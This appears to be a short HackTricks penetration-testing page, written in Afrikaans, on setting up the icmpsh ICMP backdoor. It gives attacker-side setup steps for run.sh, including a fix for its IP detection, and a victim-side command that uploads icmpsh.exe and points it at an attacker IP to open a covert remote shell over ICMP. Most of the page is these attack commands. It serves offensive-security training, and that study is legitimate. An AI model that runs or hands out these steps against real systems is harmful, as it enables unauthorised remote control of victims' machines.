{{#include ../banners/hacktricks-training.md}}

Laai die backdoor af van: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Kliëntkant

Voer die skrip uit: **run.sh**

**As jy 'n fout kry, probeer om die lyne te verander:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Vir:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Slachtofferkant**

Laai **icmpsh.exe** op na die slachtoffer en voer uit:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
